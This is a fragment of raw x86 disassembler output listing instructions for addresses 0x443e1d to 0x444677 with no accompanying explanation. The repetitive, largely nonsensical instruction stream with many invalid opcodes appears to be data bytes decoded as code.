  443e1d:	outs   dx,BYTE PTR ds:[esi]
  443e1e:	add    al,BYTE PTR [ebx]
  443e20:	mov    al,0x66
  443e22:	add    al,BYTE PTR [ebx]
  443e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443e25:	pop    esi
  443e26:	add    al,BYTE PTR [ebx]
  443e28:	test   al,0x56
  443e2a:	add    al,BYTE PTR [ebx]
  443e2c:	pushf  
  443e2d:	outs   dx,BYTE PTR ds:[esi]
  443e2e:	add    al,BYTE PTR [ebx]
  443e30:	mov    al,0x66
  443e32:	add    al,BYTE PTR [ebx]
  443e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443e35:	pop    esi
  443e36:	add    al,BYTE PTR [ebx]
  443e38:	test   al,0x56
  443e3a:	add    al,BYTE PTR [ebx]
  443e3c:	pushf  
  443e3d:	outs   dx,BYTE PTR ds:[esi]
  443e3e:	add    al,BYTE PTR [ebx]
  443e40:	mov    al,ds:0x94030266
  443e45:	pop    esi
  443e46:	add    al,BYTE PTR [ebx]
  443e48:	out    dx,al
  443e49:	push   esp
  443e4a:	fldl2t 
  443e4c:	add    esi,DWORD PTR [eax-0x25]
  443e4f:	jmp    0xea0aec57
  443e54:	add    edi,DWORD PTR [eax-0x25]
  443e57:	jmp    0xea0ac75f
  443e5c:	add    eax,DWORD PTR [eax]
  443e5e:	inc    eax
  443e5f:	fucomi st,st(1)
  443e61:	add    ebp,DWORD PTR [ebx+ebx*8]
  443e64:	jmp    0xea1f666c
  443e69:	add    edx,DWORD PTR [ebx+ebx*8]
  443e6c:	jmp    0xea1f4e74
  443e71:	add    eax,edx
  443e73:	fucomp st(1)
  443e75:	add    edx,DWORD PTR [esi-0x75fc1623]
  443e7b:	fucomp st(1)
  443e7d:	add    ebp,DWORD PTR [esi-0x4dfc1623]
  443e83:	fucomp st(1)
  443e85:	add    esp,DWORD PTR [esi-0x65fc1623]
  443e8b:	fucomp st(1)
  443e8d:	add    edi,DWORD PTR [esi]
  443e8f:	fucomp st(1)
  443e91:	add    esp,DWORD PTR [edx+0x3603e9dd]
  443e97:	fucomp st(1)
  443e99:	add    ebp,DWORD PTR [edx]
  443e9b:	fucomp st(1)
  443e9d:	add    ecx,DWORD PTR [esi-0x6dfc1623]
  443ea3:	fucomp st(1)
  443ea5:	add    eax,DWORD PTR [esi+0x7a03e9dd]
  443eab:	fucomp st(1)
  443ead:	add    ebx,DWORD PTR [esi-0x23]
  443eb0:	jmp    0xea21c0b8
  443eb5:	add    edx,DWORD PTR [esi-0x23]
  443eb8:	jmp    0xea2188c0
  443ebd:	add    ebp,DWORD PTR [esi-0x23]
  443ec0:	jmp    0xddb63ec8
  443ec5:	add    cl,ch
  443ec7:	popa   
  443ec8:	aad    0x4
  443eca:	jmp    0xe9492030
  443ecf:	popa   
  443ed0:	in     eax,dx
  443ed1:	or     ch,cl
  443ed3:	popa   
  443ed4:	fld    DWORD PTR [ecx+ebp*8]
  443ed7:	popa   
  443ed8:	in     eax,0xa
  443eda:	jmp    0xe94f3040
  443edf:	popa   
  443ee0:	std    
  443ee1:	or     ch,cl
  443ee3:	popa   
  443ee4:	jmp    0xf5a627f3
  443ee9:	or     ch,cl
  443eeb:	popa   
  443eec:	add    DWORD PTR [ebx],ecx
  443eee:	jmp    0xe94f4c54
  443ef3:	popa   
  443ef4:	stc    
  443ef5:	or     ch,cl
  443ef7:	popa   
  443ef8:	add    eax,0x1161e90b
  443efd:	or     ebp,ecx
  443eff:	popa   
  443f00:	sbb    eax,0x961e90b
  443f05:	or     ebp,ecx
  443f07:	popa   
  443f08:	adc    eax,0x2161e90b
  443f0d:	or     ebp,ecx
  443f0f:	popa   
  443f10:	sub    eax,0x1961e90b
  443f15:	or     ebp,ecx
  443f17:	popa   
  443f18:	and    eax,0x3161e90b
  443f1d:	or     ebp,ecx
  443f1f:	popa   
  443f20:	cmp    eax,0x2061e90b
  443f25:	or     ebp,ecx
  443f27:	add    BYTE PTR [ecx+0x2c],ah
  443f2a:	or     ebp,ecx
  443f2c:	popa   
  443f2d:	inc    ecx
  443f2e:	or     ebp,ecx
  443f30:	popa   
  443f31:	dec    ebp
  443f32:	or     ebp,ecx
  443f34:	popa   
  443f35:	cmp    DWORD PTR [ebx],ecx
  443f37:	jmp    0xe954929d
  443f3c:	popa   
  443f3d:	fcom   QWORD PTR [ecx]
  443f3f:	add    BYTE PTR [ebx-0x74ee732a],cl
  443f45:	(bad)  
  443f46:	nop
  443f47:	or     edi,DWORD PTR [ebx-0x2a]
  443f4a:	jl     0x443f57
  443f4c:	jnp    0x443f24
  443f4e:	mov    BYTE PTR [ebx],cl
  443f50:	mov    edx,esi
  443f52:	test   BYTE PTR [ebx],cl
  443f54:	mov    edx,esi
  443f56:	or     BYTE PTR [ebx],0x7b
  443f59:	(bad)  
  443f5a:	ins    BYTE PTR es:[edi],dx
  443f5b:	or     edi,DWORD PTR [ebx-0x2a]
  443f5e:	(bad)  
  443f5f:	or     eax,0xde2d64b
  443f64:	dec    ebx
  443f65:	(bad)  
  443f66:	jo     0x443f73
  443f68:	cmp    edx,esi
  443f6a:	pop    esp
  443f6b:	or     edi,DWORD PTR [ebx]
  443f6d:	(bad)  
  443f6e:	push   0x54d64b0b
  443f73:	or     ecx,DWORD PTR [ebx-0x2a]
  443f76:	mov    al,0xb
  443f78:	cmp    edx,esi
  443f7a:	pushf  
  443f7b:	or     edi,DWORD PTR [ebx]
  443f7d:	(bad)  
  443f7e:	mov    DWORD PTR [ebx+ecx*1],ecx
  443f81:	(bad)  
  443f82:	jne    0x443f90
  443f84:	or     edx,esi
  443f86:	or     DWORD PTR [ebx+edi*8],0xc6dd5
  443f8d:	sti    
  443f8e:	aad    0x98
  443f90:	or     ecx,DWORD PTR [ebx]
  443f92:	(bad)  
  443f93:	test   BYTE PTR [ebx],cl
  443f95:	or     edx,esi
  443f97:	nop
  443f98:	or     edi,ebx
  443f9a:	aad    0x7c
  443f9c:	or     edi,ebx
  443f9e:	aad    0x88
  443fa0:	or     ecx,ebx
  443fa2:	aad    0x74
  443fa4:	or     ecx,ebx
  443fa6:	aad    0x80
  443fa8:	or     edi,DWORD PTR [ebx-0x44f4932b]
  443fae:	aad    0x78
  443fb0:	or     ecx,ebx
  443fb2:	aad    0x64
  443fb4:	or     ecx,ebx
  443fb6:	aad    0x20
  443fb8:	or     esp,DWORD PTR [edx+0x0]
  443fbb:	add    edx,DWORD PTR [ecx+ebx*2]
  443fbe:	add    BYTE PTR [ebx],al
  443fc0:	sbb    BYTE PTR [ecx+0x0],ch
  443fc3:	add    ecx,DWORD PTR [ecx+ebp*2]
  443fc6:	add    BYTE PTR [ebx],al
  443fc8:	adc    BYTE PTR [ecx+0x0],bl
  443fcb:	add    eax,DWORD PTR [ecx+ebx*2]
  443fce:	add    BYTE PTR [ebx],al
  443fd0:	or     BYTE PTR [ecx+0x0],ch
  443fd3:	add    edi,esp
  443fd5:	push   0x59000300
  443fda:	add    BYTE PTR [ebx],al
  443fdc:	hlt    
  443fdd:	pop    eax
  443fde:	add    BYTE PTR [ebx],al
  443fe0:	clc    
  443fe1:	push   0x68ec02f2
  443fe6:	repnz add dh,al
  443fe9:	pop    eax
  443fea:	repnz add ah,ah
  443fed:	pop    eax
  443fee:	repnz add ch,al
  443ff1:	add    BYTE PTR [eax-0xe],ch
  443ff4:	add    bl,ah
  443ff6:	push   0x58f002f2
  443ffb:	repnz add ah,ah
  443ffe:	pop    eax
  443fff:	repnz add ch,al
  444002:	push   0x68cc02f2
  444007:	repnz add cl,BYTE PTR [ebx+0x59]
  44400b:	repnz add al,ah
  44400e:	pop    eax
  44400f:	repnz add ch,BYTE PTR [esi]
  444012:	outs   dx,DWORD PTR ds:[esi]
  444013:	repnz add dh,BYTE PTR [edx]
  444016:	addr16 repnz add dl,al
  44401a:	pop    eax
  44401b:	repnz add al,ah
  44401e:	pop    eax
  44401f:	repnz add cl,al
  444022:	push   0x68ac02f2
  444027:	repnz add ch,BYTE PTR [ebx]
  44402a:	pop    ecx
  44402b:	repnz add ah,BYTE PTR [eax+ebx*2+0x536802f2]
  444033:	fldl2t 
  444035:	add    edx,esi
  444037:	shr    ecx,cl
  444039:	add    eax,DWORD PTR [edx]
  44403b:	aam    0xe9
  44403d:	add    ecx,esi
  44403f:	shr    ecx,cl
  444041:	add    edi,edx
  444043:	shr    ecx,cl
  444045:	add    esp,esi
  444047:	shr    ecx,cl
  444049:	add    esi,edx
  44404b:	shr    ecx,cl
  44404d:	add    ebx,esi
  44404f:	shr    ecx,cl
  444051:	add    ebp,edx
  444053:	shr    ecx,cl
  444055:	add    eax,DWORD PTR [eax]
  444057:	not    dl
  444059:	jmp    0xea182261
  44405e:	add    ebx,esi
  444060:	shr    ecx,cl
  444062:	add    eax,DWORD PTR [esi-0x29]
  444065:	jmp    0xea18066d
  44406a:	add    edx,edx
  44406c:	shr    ecx,cl
  44406e:	add    edi,DWORD PTR [esi-0x35fc162d]
  444074:	shr    ecx,cl
  444076:	add    edx,DWORD PTR [esi-0x3dfc162d]
  44407c:	shr    ecx,cl
  44407e:	add    ecx,DWORD PTR [esi-0x45fc162d]
  444084:	shr    ecx,cl
  444086:	add    esp,DWORD PTR [esi-0x4dfc162d]
  44408c:	shr    ecx,cl
  44408e:	add    ebx,DWORD PTR [esi-0x55fc162d]
  444094:	shr    ecx,cl
  444096:	add    ebx,DWORD PTR [ebx]
  444098:	xlat   BYTE PTR ds:[ebx]
  444099:	jmp    0xea17d2a1
  44409e:	add    ebx,DWORD PTR [esi+0x2a03e9d3]
  4440a4:	shr    ecx,cl
  4440a6:	add    edx,DWORD PTR [esi+0x2203e9d3]
  4440ac:	rol    DWORD PTR [eax],cl
  4440ae:	jmp    0xe94eee14
  4440b3:	popa   
  4440b4:	mov    eax,ds:0xb561e90a
  4440b9:	or     ch,cl
  4440bb:	add    BYTE PTR [ecx-0x47],ah
  4440be:	or     ch,cl
  4440c0:	popa   
  4440c1:	int    0xa
  4440c3:	jmp    0xe94f0229
  4440c8:	popa   
  4440c9:	aad    0xa
  4440cb:	jmp    0xe94f0a31
  4440d0:	popa   
  4440d1:	fisttp QWORD PTR [edx]
  4440d3:	jmp    0xe94f7339
  4440d8:	popa   
  4440d9:	in     eax,0x8
  4440db:	jmp    0xe94f1a41
  4440e0:	popa   
  4440e1:	in     eax,dx
  4440e2:	or     cl,ch
  4440e4:	popa   
  4440e5:	loope  0x4440ef
  4440e7:	jmp    0xe94d364d
  4440ec:	popa   
  4440ed:	jmp    0xfda629fa
  4440f2:	or     cl,ch
  4440f4:	popa   
  4440f5:	icebp  
  4440f6:	or     cl,ch
  4440f8:	popa   
  4440f9:	add    eax,0xf961e909
  4440fe:	or     cl,ch
  444100:	popa   
  444101:	or     eax,0x161e909
  444106:	or     ecx,ebp
  444108:	popa   
  444109:	adc    eax,0x961e909
  44410e:	or     ecx,ebp
  444110:	popa   
  444111:	sbb    eax,0x7061e909
  444116:	or     ebp,ecx
  444118:	popa   
  444119:	and    eax,0x1961e909
  44411e:	or     ecx,ebp
  444120:	add    BYTE PTR [ecx+0x2d],ah
  444123:	or     ecx,ebp
  444125:	popa   
  444126:	and    DWORD PTR [ecx],ecx
  444128:	add    bl,cl
  44412a:	fisub  DWORD PTR [ecx+ecx*1+0x9b0dabb]
  444131:	mov    ebx,0xcb099cda
  444136:	fisubr DWORD PTR [eax-0x6b2534f7]
  44413c:	or     DWORD PTR [ebx-0x44f41326],edi
  444142:	fimul  DWORD PTR [ecx+ecx*1+0x998da8b]
  444149:	mov    ebx,edx
  44414b:	test   BYTE PTR [ecx],cl
  44414d:	jnp    0x444129
  44414f:	nop
  444150:	or     DWORD PTR [ebx-0x26],edi
  444153:	jl     0x44415e
  444155:	mov    ebx,edx
  444157:	mov    BYTE PTR [ecx],cl
  444159:	mov    ebx,edx
  44415b:	je     0x444166
  44415d:	jnp    0x444139
  44415f:	or     BYTE PTR [ecx],0x7b
  444162:	fisubr DWORD PTR [ecx+ecx*1+0x4b]
  444166:	fidivr DWORD PTR [eax+0x9]
  444169:	dec    ebx
  44416a:	fisub  DWORD PTR [ecx+ecx*1+0x3b]
  44416e:	fidiv  DWORD PTR [eax+0x9]
  444171:	cmp    ebx,edx
  444173:	pop    esp
  444174:	or     DWORD PTR [ebx-0x26],ecx
  444177:	push   0xd2da4b09
  44417c:	or     edi,DWORD PTR [ebx]
  44417e:	fisub  DWORD PTR [eax+0x9]
  444181:	cmp    ebx,edx
  444183:	dec    esp
  444184:	or     DWORD PTR [eax],eax
  444186:	or     ebx,edx
  444188:	pop    eax
  444189:	or     DWORD PTR [ebx],ecx
  44418b:	fiadd  DWORD PTR [ecx+ecx*1-0x5]
  44418f:	fst    DWORD PTR [eax+0x9]
  444192:	sti    
  444193:	fnstcw WORD PTR [ecx+ecx*1]
  444196:	or     ebx,edx
  444198:	dec    eax
  444199:	or     DWORD PTR [ebx],ecx
  44419b:	fidiv  DWORD PTR [ecx+ecx*1]
  44419e:	sti    
  44419f:	fld    DWORD PTR [eax+0x9]
  4441a2:	(bad)  
  4441a3:	lock add dh,BYTE PTR [ebx+ebp*2]
  4441a7:	lock add bh,BYTE PTR [eax]
  4441aa:	imul   esi,eax,0x2
  4441ad:	sub    al,0x5b
  4441af:	lock add dl,BYTE PTR [esi-0x65fd0fa7]
  4441b6:	imul   esi,eax,0xf0698e02
  4441bc:	add    dl,BYTE PTR [edx+0x3902f059]
  4441c2:	pop    ebx
  4441c3:	lock add cl,BYTE PTR [edx+0x7e02f069]
  4441ca:	imul   esi,eax,0xf0598202
  4441d0:	add    ch,BYTE PTR [ecx]
  4441d2:	pop    ebx
  4441d3:	lock add bl,BYTE PTR ds:0x6e02f06b
  4441da:	imul   esi,eax,0xf05b1502
  4441e0:	add    ah,BYTE PTR [esi+0x59]
  4441e3:	lock add ch,BYTE PTR [edx+0x69]
  4441e7:	repnz add bl,BYTE PTR [esi+0x0]
  4441eb:	imul   esi,edx,0xf2596202
  4441f1:	add    dh,al
  4441f3:	pop    edx
  4441f4:	repnz add ah,ah
  4441f7:	push   0xfffffff2
  4441f9:	add    ch,al
  4441fb:	push   0xfffffff2
  4441fd:	add    dl,BYTE PTR [edx+0x59]
  444200:	repnz add bh,cl
  444203:	pop    edx
  444204:	repnz add ch,ch
  444207:	push   0xfffffff2
  444209:	add    dh,cl
  44420b:	push   0xfffffff2
  44420d:	add    ah,ch
  44420f:	pop    edx
  444210:	repnz add ch,cl
  444213:	pop    edx
  444214:	repnz add bl,ch
  444217:	push   0xfffffff2
  444219:	add    ch,BYTE PTR [esi]
  44421b:	imul   ebx,ecx,0xd03003e9
  444221:	jmp    0xea164d29
  444226:	add    ebp,DWORD PTR [edi-0x4cfc162f]
  44422c:	shr    ecx,1
  44422e:	add    esp,DWORD PTR [edi+0x6c03e9d1]
  444234:	shr    cl,1
  444236:	add    ebx,DWORD PTR [eax-0x30]
  444239:	jmp    0xea14a641
  44423e:	add    edx,DWORD PTR [eax-0x30]
  444241:	jmp    0xea162d49
  444246:	add    ecx,edi
  444248:	shr    ecx,1
  44424a:	add    edx,ebx
  44424c:	shr    ecx,1
  44424e:	add    eax,DWORD PTR [eax]
  444250:	(bad)  
  444251:	shr    ecx,1
  444253:	add    edi,DWORD PTR [ebx-0x20fc162f]
  444259:	shr    ecx,1
  44425b:	add    eax,DWORD PTR [edi+ecx*8-0x2e28fc17]
  444262:	jmp    0xea160d6a
  444267:	add    ebp,edi
  444269:	shr    cl,1
  44426b:	add    esi,ebx
  44426d:	shr    cl,1
  44426f:	add    esp,edi
  444271:	shr    cl,1
  444273:	add    ebx,ebx
  444275:	shr    cl,1
  444277:	add    edi,DWORD PTR [edi-0x1cfc162f]
  44427d:	shr    cl,1
  44427f:	add    esi,DWORD PTR [edi-0x54fc162f]
  444285:	shr    ecx,1
  444287:	add    ecx,DWORD PTR [edi-0x2bfc162f]
  44428d:	into   
  44428e:	jmp    0xea136296
  444293:	add    ecx,esp
  444295:	into   
  444296:	add    cl,ch
  444298:	popa   
  444299:	pop    ds
  44429a:	or     ch,cl
  44429c:	popa   
  44429d:	xor    ecx,DWORD PTR [edx]
  44429f:	jmp    0xe94e6a05
  4442a4:	popa   
  4442a5:	cmp    ecx,DWORD PTR [edx]
  4442a7:	jmp    0xe94e720d
  4442ac:	popa   
  4442ad:	inc    ebx
  4442ae:	or     ch,cl
  4442b0:	popa   
  4442b1:	aaa    
  4442b2:	or     ch,cl
  4442b4:	add    BYTE PTR [ecx+0x4b],ah
  4442b7:	or     ch,cl
  4442b9:	popa   
  4442ba:	aas    
  4442bb:	or     ch,cl
  4442bd:	popa   
  4442be:	push   ebx
  4442bf:	or     ch,cl
  4442c1:	popa   
  4442c2:	inc    edi
  4442c3:	or     ch,cl
  4442c5:	popa   
  4442c6:	pop    ebx
  4442c7:	or     ch,cl
  4442c9:	popa   
  4442ca:	dec    edi
  4442cb:	or     ch,cl
  4442cd:	popa   
  4442ce:	arpl   WORD PTR [edx],cx
  4442d0:	jmp    0xe94e9a36
  4442d5:	popa   
  4442d6:	imul   ecx,DWORD PTR [edx],0xffffffe9
  4442d9:	popa   
  4442da:	pop    edi
  4442db:	or     ch,cl
  4442dd:	popa   
  4442de:	jae    0x4442ea
  4442e0:	jmp    0xe94eaa46
  4442e5:	popa   
  4442e6:	jnp    0x4442f2
  4442e8:	jmp    0xe94eb24e
  4442ed:	popa   
  4442ee:	or     DWORD PTR [edx],0xffffffe9
  4442f1:	popa   
  4442f2:	ja     0x4442fe
  4442f4:	jmp    0xe94ece5a
  4442f9:	popa   
  4442fa:	jg     0x444306
  4442fc:	jmp    0xe94ed662
  444301:	popa   
  444302:	xchg   DWORD PTR [edx],ecx
  444304:	jmp    0xe94ede6a
  444309:	popa   
  44430a:	(bad)
  44430e:	mov    ds:0xd6fb000a,eax
  444313:	inc    edx
  444314:	or     bh,bl
  444316:	(bad)  
  444317:	or     al,BYTE PTR cs:[eax]
  44431a:	or     edx,edi
  44431c:	cmp    cl,BYTE PTR [edx]
  44431e:	or     edx,edi
  444320:	es or  bh,bl
  444323:	(bad)  
  444324:	xor    cl,BYTE PTR [edx]
  444326:	sti    
  444327:	(bad)  
  444328:	push   ds
  444329:	or     cl,bl
  44432b:	(bad)  
  44432c:	sub    cl,BYTE PTR [edx]
  44432e:	retf   
  44432f:	(bad)  
  444330:	push   ss
  444331:	or     bh,BYTE PTR [ebx-0x44f5dd2a]
  444337:	(bad)  
  444338:	push   cs
  444339:	or     cl,bl
  44433b:	(bad)  
  44433c:	sbb    cl,BYTE PTR [edx]
  44433e:	retf   
  44433f:	(bad)  
  444340:	push   es
  444341:	or     bh,BYTE PTR [ebx-0x44f5ed2a]
  444347:	(bad)  
  444348:	dec    BYTE PTR [ecx]
  44434a:	mov    edx,esi
  44434c:	or     cl,BYTE PTR [edx]
  44434e:	mov    edx,esi
  444350:	test   BYTE PTR [ecx],0x7b
  444353:	(bad)  
  444354:	add    cl,BYTE PTR [edx]
  444356:	jnp    0x44432e
  444358:	out    dx,al
  444359:	or     DWORD PTR [ebx-0x74f6052a],ecx
  44435f:	(bad)  
  444360:	out    0x9,al
  444362:	jnp    0x44433a
  444364:	repnz or DWORD PTR [ebx-0x2a],edi
  444368:	fimul  WORD PTR [ecx]
  44436a:	dec    ebx
  44436b:	(bad)  
  44436c:	jmp    0x3b09:0xd6d64b09
  444373:	(bad)  
  444374:	loop   0x44437f
  444376:	cmp    edx,esi
  444378:	into   
  444379:	or     DWORD PTR [ebx-0x2a],ecx
  44437c:	fimul  DWORD PTR [ecx]
  44437e:	add    BYTE PTR [ebx-0x2a],cl
  444381:	(bad)  
  444382:	or     DWORD PTR [ebx],edi
  444384:	(bad)  
  444385:	ror    BYTE PTR [ecx],cl
  444387:	cmp    edx,esi
  444389:	mov    esi,0x2f06209
  44438e:	retf   0xf06b
  444391:	add    bh,BYTE PTR [esi-0x3dfd0fa5]
  444397:	pop    ebx
  444398:	lock add dh,BYTE PTR [esi-0x45fd0f95]
  44439f:	imul   esi,eax,0x2
  4443a2:	scas   al,BYTE PTR es:[edi]
  4443a3:	pop    ebx
  4443a4:	lock add dh,BYTE PTR [edx-0x59fd0fa5]
  4443ab:	imul   esi,eax,0x2
  4443ae:	stos   BYTE PTR es:[edi],al
  4443af:	imul   esi,eax,0x2
  4443b2:	sahf   
  4443b3:	pop    ebx
  4443b4:	lock add ah,BYTE PTR [edx-0x69fd0fa5]
  4443bb:	imul   esi,eax,0x2
  4443be:	call   0xf05b:0x8e02f06b
  4443c5:	add    dl,BYTE PTR [edx-0x79fd0fa5]
  4443cb:	imul   esi,eax,0x2
  4443ce:	mov    ch,BYTE PTR [ebx-0x10]
  4443d1:	add    bh,BYTE PTR [esi+0x5b]
  4443d4:	lock add al,BYTE PTR [edx+0x7602f05b]
  4443db:	imul   esi,eax,0x2
  4443de:	jp     0x44444b
  4443e0:	lock add ch,BYTE PTR [esi+0x0]
  4443e4:	pop    ebx
  4443e5:	lock add dh,BYTE PTR [edx+0x5b]
  4443e9:	lock add ah,BYTE PTR [esi+0x6b]
  4443ed:	repnz add ch,BYTE PTR [edx+0x6b]
  4443f1:	repnz add bl,BYTE PTR [esi+0x5b]
  4443f5:	repnz add ah,BYTE PTR [edx+0x5b]
  4443f9:	repnz add dl,BYTE PTR [esi+0x6b]
  4443fd:	repnz add bl,BYTE PTR [edx+0x6b]
  444401:	repnz add cl,BYTE PTR [esi+0x5b]
  444405:	fldl2t 
  444407:	add    edx,DWORD PTR [eax-0x5bfc162e]
  44440d:	shr    cl,cl
  44440f:	add    ebp,DWORD PTR [eax+0x4c03e9d2]
  444415:	shr    cl,cl
  444417:	add    esp,DWORD PTR [eax+0x3403e9d2]
  44441d:	shr    cl,cl
  44441f:	add    edi,DWORD PTR [eax]
  444421:	shr    cl,cl
  444423:	add    edi,DWORD PTR [edx+edx*8]
  444426:	jmp    0xea16742e
  44442b:	add    eax,DWORD PTR [edx+edx*8-0x2d77fc17]
  444432:	jmp    0xea16b03a
  444437:	add    eax,DWORD PTR [eax+0x5403e9d2]
  44443d:	shr    cl,cl
  44443f:	add    ebx,DWORD PTR [eax-0x2e]
  444442:	jmp    0xea16a04a
  444447:	add    eax,DWORD PTR [eax]
  444449:	push   eax
  44444a:	shr    cl,cl
  44444c:	add    esp,DWORD PTR [edx+edx*8-0x17]
  444450:	add    ebp,DWORD PTR [eax-0x2e]
  444453:	jmp    0xea15d05b
  444458:	add    esp,DWORD PTR [eax-0x2e]
  44445b:	jmp    0xea15b863
  444460:	add    edi,DWORD PTR [eax-0x2f]
  444463:	jmp    0xea15c06b
  444468:	add    esi,DWORD PTR [eax-0x2f]
  44446b:	jmp    0xea158873
  444470:	add    ecx,DWORD PTR [eax-0x2f]
  444473:	jmp    0xea15707b
  444478:	add    eax,DWORD PTR [eax-0x2f]
  44447b:	jmp    0x1155883
  444480:	jmp    0xe94c47e6
  444485:	popa   
  444486:	invd   
  444488:	jmp    0xe94c4fee
  44448d:	popa   
  44448e:	pop    ss
  44448f:	or     cl,ch
  444491:	popa   
  444492:	adc    ecx,DWORD PTR [eax]
  444494:	jmp    0xe94c63fa
  444499:	popa   
  44449a:	sbb    ecx,DWORD PTR [eax]
  44449c:	jmp    0xe94c6c02
  4444a1:	popa   
  4444a2:	and    ecx,DWORD PTR [eax]
  4444a4:	jmp    0xe94c740a
  4444a9:	popa   
  4444aa:	sub    ecx,DWORD PTR [eax]
  4444ac:	jmp    0x87ba5b1
  4444b1:	jmp    0xe94c7817
  4444b6:	popa   
  4444b7:	aas    
  4444b8:	or     cl,ch
  4444ba:	popa   
  4444bb:	cmp    ecx,DWORD PTR [eax]
  4444bd:	jmp    0xe94c8c23
  4444c2:	popa   
  4444c3:	inc    ebx
  4444c4:	or     cl,ch
  4444c6:	popa   
  4444c7:	dec    edi
  4444c8:	or     cl,ch
  4444ca:	popa   
  4444cb:	dec    ebx
  4444cc:	or     cl,ch
  4444ce:	popa   
  4444cf:	push   edi
  4444d0:	or     cl,ch
  4444d2:	popa   
  4444d3:	push   ebx
  4444d4:	or     cl,ch
  4444d6:	popa   
  4444d7:	pop    edi
  4444d8:	or     cl,ch
  4444da:	popa   
  4444db:	pop    ebx
  4444dc:	or     cl,ch
  4444de:	popa   
  4444df:	addr16 or cl,ch
  4444e2:	popa   
  4444e3:	arpl   WORD PTR [eax],cx
  4444e5:	jmp    0xe94cb44b
  4444ea:	popa   
  4444eb:	imul   ecx,DWORD PTR [eax],0xffffffe9
  4444ee:	popa   
  4444ef:	ja     0x4444f9
  4444f1:	jmp    0xe94cb857
  4444f6:	popa   
  4444f7:	jg     0x444501
  4444f9:	add    BYTE PTR [ebx],bh
  4444fb:	(bad)  [edx+0x8]
  4444fe:	dec    ebx
  4444ff:	fisttp DWORD PTR [esi+0x8]
  444502:	dec    ebx
  444503:	fistp  DWORD PTR [edx+0x8]
  444506:	cmp    ebx,ebx
  444508:	inc    esi
  444509:	or     BYTE PTR [ebx],bh
  44450b:	fist   DWORD PTR [edx+0x8]
  44450e:	or     ebx,ebx
  444510:	or     BYTE PTR ds:[eax],al
  444513:	or     ebx,ebx
  444515:	dec    edx
  444516:	or     bl,bh
  444518:	fidiv  DWORD PTR [esi]
  44451a:	or     bl,bh
  44451c:	fiadd  DWORD PTR [edx+0x8]
  44451f:	or     ebx,ebx
  444521:	or     BYTE PTR cs:[ebx],cl
  444524:	fstp   TBYTE PTR [edx]
  444526:	or     bl,bh
  444528:	fisub  DWORD PTR [esi]
  44452a:	or     bl,bh
  44452c:	fidiv  DWORD PTR [edx]
  44452e:	or     bl,cl
  444530:	ficomp DWORD PTR [esi]
  444532:	or     bl,cl
  444534:	fisubr DWORD PTR [edx]
  444536:	or     BYTE PTR [ebx-0x44f7e926],bh
  44453c:	fisub  DWORD PTR [edx]
  44453e:	or     bl,cl
  444540:	fimul  DWORD PTR [esi]
  444542:	or     bl,cl
  444544:	ficomp DWORD PTR [edx]
  444546:	or     BYTE PTR [ebx-0x44f7f926],bh
  44454c:	ficom  DWORD PTR [edx]
  44454e:	or     BYTE PTR [ebx-0x74f8e026],cl
  444554:	fisubr DWORD PTR [ebx]
  444556:	pop    es
  444557:	jnp    0x444533
  444559:	test   BYTE PTR [edi],0x7b
  44455c:	fiadd  DWORD PTR [edx]
  44455e:	or     BYTE PTR [ebx-0x74f81126],cl
  444564:	(bad)  
  444566:	pop    es
  444567:	jnp    0x444543
  444569:	out    0x7,al
  44456b:	jnp    0x444547
  44456d:	repnz pop es
  44456f:	dec    ebx
  444570:	fcmovu st,st(6)
  444572:	pop    es
  444573:	(bad)  
  444574:	lock add ch,dl
  444577:	add    BYTE PTR [ebp-0x10],ah
  44457a:	add    bl,dh
  44457c:	pop    ebp
  44457d:	lock add ah,dl
  444580:	gs lock add dl,dh
  444584:	pop    ebp
  444585:	lock add bl,dl
  444588:	gs lock add cl,dh
  44458c:	pop    ebp
  44458d:	lock add dl,dl
  444590:	gs lock add al,dh
  444594:	pop    ebp
  444595:	lock add cl,dl
  444598:	lock add bh,BYTE PTR gs:[esi-0x3dfd0fa3]
  4445a0:	lock add dh,BYTE PTR gs:[esi-0x45fd0fa3]
  4445a8:	lock add ch,BYTE PTR gs:[esi-0x4dfd0fa3]
  4445b0:	lock add ch,BYTE PTR gs:[ebx+0x5f]
  4445b5:	lock add bl,BYTE PTR [edi+0x67]
  4445b9:	lock add ah,BYTE PTR [ebx+0x5f]
  4445bd:	lock add dl,BYTE PTR [edi+0x67]
  4445c1:	lock add bl,BYTE PTR [ebx+0x5f]
  4445c5:	lock add cl,BYTE PTR [edi+0x67]
  4445c9:	lock add dl,BYTE PTR [ebx+0x5f]
  4445cd:	lock add bl,BYTE PTR [edi+eiz*2]
  4445d1:	lock add al,BYTE PTR [esi-0x75fd0fa3]
  4445d8:	lock add bh,BYTE PTR gs:[esi+0x0]
  4445dd:	pop    ebp
  4445de:	lock add al,BYTE PTR [edx+0x3b02f065]
  4445e5:	pop    edi
  4445e6:	lock add ch,BYTE PTR [edi]
  4445e9:	lock add dh,BYTE PTR [bp+di]
  4445ed:	pop    edi
  4445ee:	fldl2t 
  4445f0:	add    eax,DWORD PTR [ebp-0x43fc162a]
  4445f6:	aam    0xe9
  4445f8:	add    edi,DWORD PTR [eax-0x5bfc162c]
  4445fe:	aam    0xe9
  444600:	add    eax,eax
  444602:	aam    0xe9
  444604:	add    ecx,DWORD PTR [esp+edx*8-0x2b77fc17]
  44460b:	jmp    0xea18da13
  444610:	add    esi,DWORD PTR [eax+0x6903e9d4]
  444616:	(bad)  
  444617:	jmp    0xea1a531f
  44461c:	add    esp,DWORD PTR [ecx-0x2a]
  44461f:	jmp    0xea18e627
  444624:	add    ebp,DWORD PTR [esp+edx*8]
  444627:	jmp    0xea186e2f
  44462c:	add    esi,DWORD PTR [esp+edx*8]
  44462f:	jmp    0xea18d637
  444634:	add    edi,DWORD PTR [esp+edx*8-0x17]
  444638:	add    edi,DWORD PTR [eax-0x2c]
  44463b:	jmp    0xea18aa43
  444640:	add    eax,DWORD PTR [eax]
  444642:	adc    ah,0xe9
  444645:	add    ecx,DWORD PTR [esp+edx*8-0x17]
  444649:	add    ecx,DWORD PTR [eax-0x2c]
  44464c:	jmp    0xea189a54
  444651:	add    esi,DWORD PTR [eax-0x2c]
  444654:	jmp    0xea18a25c
  444659:	add    ebx,DWORD PTR [eax-0x2c]
  44465c:	jmp    0xea17ca64
  444661:	add    esp,DWORD PTR [eax-0x2c]
  444664:	jmp    0x117b26c
  444669:	jmp    0xe94225cf
  44466e:	popa   
  44466f:	jmp    0x44466e
  444671:	call   0xe9422dd7
  444676:	popa   
  444677:	repz std 
